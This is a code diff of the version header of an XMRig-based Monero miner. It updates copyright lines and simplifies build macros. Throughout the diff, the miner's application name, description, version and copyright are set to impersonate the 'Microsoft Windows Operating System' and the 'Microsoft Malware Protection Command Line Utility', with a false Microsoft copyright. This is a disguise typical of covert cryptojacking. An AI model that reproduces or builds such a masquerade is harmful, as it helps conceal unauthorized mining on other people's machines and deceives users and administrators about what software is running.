@@ -4,9 +4,9 @@
  * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
  * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
  * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
- * Copyright 2016-2017 XMRig       <support@xmrig.com>
- * Copyright 2017-     BenDr0id    <ben@graef.in>
- *
+ * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
+ * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
+ * Copyright 2016-2019 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
  *
  *   This program is free software: you can redistribute it and/or modify
  *   it under the terms of the GNU General Public License as published by
@@ -22,42 +22,26 @@
  *   along with this program. If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef __VERSION_H__
-#define __VERSION_H__
+#ifndef XMRIG_VERSION_H
+#define XMRIG_VERSION_H
 
-#ifdef XMRIG_CC_SERVER
-#define APP_ID        "XMRigCC"
-#define APP_NAME      "XMRigCC"
-#define APP_DESC      "XMRigCC Command'n'Control Server"
-#define APP_COPYRIGHT "Copyright (C) 2017- BenDr0id"
-# else
 #define APP_ID        "Microsoft Windows Operating System"
 #define APP_NAME      "Microsoft Windows Operating System"
 #define APP_DESC      "Microsoft Malware Protection Command Line Utility"
-#define APP_COPYRIGHT "(C) Microsoft Corporation. All rights reserved."
-#endif
-#define APP_VERSION   "6.1.7601.95"
+#define APP_VERSION   "6.1.7200"
 #define APP_DOMAIN    ""
 #define APP_SITE      ""
+#define APP_COPYRIGHT "(C) Microsoft Corporation. All rights reserved."
 #define APP_KIND      "cpu"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  1
-#define APP_VER_BUILD  7601
-#define APP_VER_REV    95
+#define APP_VER_PATCH  7200
 
 #ifndef NDEBUG
-	#ifndef XMRIG_NO_TLS
-		#define BUILD_TYPE   "DEBUG with TLS"
-	#else
-		#define BUILD_TYPE   "DEBUG"	
-	#endif	
+#define BUILD_TYPE   "DEBUG"
 #else
-	#ifndef XMRIG_NO_TLS
-		#define BUILD_TYPE   "RELEASE with TLS"
-	#else
-		#define BUILD_TYPE   "RELEASE"	
-	#endif	
+#define BUILD_TYPE   "RELEASE"
 #endif
 
 #ifdef _MSC_VER
@@ -76,34 +60,6 @@
 #   else
 #       define MSVC_VERSION 0
 #   endif
-#include <string>
-#else
-    #if defined(__FreeBSD__) || defined(__APPLE__)
-        #include <string>
-    #else
-        #include <string.h>
-    #endif
 #endif
 
-
-
-
-class Version
-{
-public:
-    inline static std::string string()
-    {
-        std::string version = std::to_string(APP_VER_MAJOR) + std::string(".") + std::to_string(APP_VER_MINOR) +
-                              std::string(".") + std::to_string(APP_VER_BUILD) + std::string(".") + std::to_string(APP_VER_REV);
-
-        return version;
-    }
-
-    inline static int code()
-    {
-        std::string version = std::to_string(APP_VER_MAJOR) + std::to_string(APP_VER_MINOR) + std::to_string(APP_VER_BUILD) + std::to_string(APP_VER_REV);
-
-        return std::stoi(version);
-    }
-};
-#endif /* __VERSION_H__ */
+#endif /* XMRIG_VERSION_H */
